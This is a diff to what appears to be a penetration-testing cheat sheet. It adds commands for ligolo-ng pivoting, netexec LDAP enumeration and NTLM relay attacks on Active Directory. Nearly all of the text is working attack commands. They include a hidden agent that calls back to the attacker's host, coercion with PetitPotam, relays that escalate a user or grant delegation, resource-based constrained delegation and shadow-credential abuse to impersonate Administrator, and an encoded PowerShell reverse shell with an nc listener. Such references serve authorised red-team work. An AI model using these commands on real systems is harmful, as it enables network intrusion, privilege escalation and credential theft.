@@ -720,10 +720,7 @@ base64 -w0 <USERNAME>.kirbi > <USERNAME>.kirbi.base64
 
 ##### Download Proxy and Agent
 
-```shell
-wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
-wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
-```
+> https://github.com/nicocha30/ligolo-ng/releases
 
 ##### Prepare Tunnel Interface
 
@@ -771,10 +768,36 @@ sudo ip route add 240.0.0.1/32 dev ligolo
 [Agent : user@target] » start
 ```
 
-###### Port Forwarding
+##### Port Forwarding
 
 ```shell
 [Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
+```
+
+##### Alternative Session Configuration
+
+###### Setup Proxy on Attacker Machine
+
+```console
+sudo ./proxy -selfcert
+```
+
+###### Prepare Tunnel Interface
+
+```console
+ligolo-ng » ifcreate --name ligolo
+```
+
+###### Add Route to Tunnel Interface
+
+```console
+ligolo-ng » route_add --name ligolo --route <SUBNET>
+```
+
+###### Setup Agent on Target Machine
+
+```cmd
+Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect <LHOST>:11601 -ignore-cert" -WindowStyle Hidden
 ```
 
 #### Linux
@@ -1376,6 +1399,8 @@ sudo rdate -s <RHOST>
 ##### timedatectl
 
 ```shell
+sudo timedatectl show
+sudo timedatectl set-ntp false
 sudo timedatectl set-timezone UTC
 sudo timedatectl list-timezones
 sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
@@ -3490,8 +3515,8 @@ netexec smb <RHOST> -u <USERNAME> -k --use-kcache
 ###### Generate krb5.conf
 
 ```shell
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --generate-krb5-file /tmp/krb5conf2
-export KRB5_CONFIG=/tmp/krb5conf2
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --generate-krb5-file ./krb5.conf
+export KRB5_CONFIG=./krb5.conf
 echo '<PASSWORD>' | kinit <USERNAME>@<DOMAIN>
 klist
 ```
@@ -3639,11 +3664,16 @@ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups "<GROUP>"
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --admin-count
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(adminCount=1)" "sAMAccountName"
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dc-list
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M sccm -o REC_RESOLVE=TRUE
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dns-server <RHOST> -c All
 ```
@@ -5566,16 +5596,63 @@ impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /P
 
 ###### Common Commands
 
-```shell
+```console
 impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --interactive
+impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access
+impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --remove-mic -i
+impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --remove-mic --interactive
+impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --escalate-user '<USERNAME>'
+impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --escalate-user '<USERNAME>' --remove-mic
 impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --no-dump --add-dns-record 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' '<LHOST>'
 impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
 impacket-ntlmrelayx -t <LHOST> --no-http-server -smb2support -c "powershell -enc JAB<--- SNIP --->j=="
+impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --no-dump --no-da --no-acl
 ```
 
-###### Example
+###### Execution
 
-```shell
+```console
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>
+```
+
+or
+
+```console
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST> METHOD=petitpotam
+```
+
+###### Connect to LDAP Shell
+
+```console
+nc 127.0.0.1 11000
+```
+
+###### LDAP Shell
+
+###### Resource-Based Constrained Delegtion (RBCD)
+
+```console
+set_rbcd <RHOST>$ <RHOST>$
+```
+
+```console
+impacket-getST -spn 'cifs/<RHOST>.<DOMAIN>' -impersonate Administrator -hashes
+```
+
+```console
+netexec smb <RHOST>.<DOMAIN> -u '<RHOST>$' -H <HASH> --delegate Administrator --self
+```
+
+###### Shadow Credentials
+
+```console
+clear_shadow_creds <RHOST>$
+set_shadow_creds <RHOST>$
+```
+
+###### Reverse Shell Example
+
+```console
 impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JAB<--- SNIP --->j=="
 ```
 
@@ -5583,7 +5660,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc
 dir \\<LHOST>\foobar
 ```
 
-```shell
+```console
 nc -lnvp <LPORT>
 ```
 
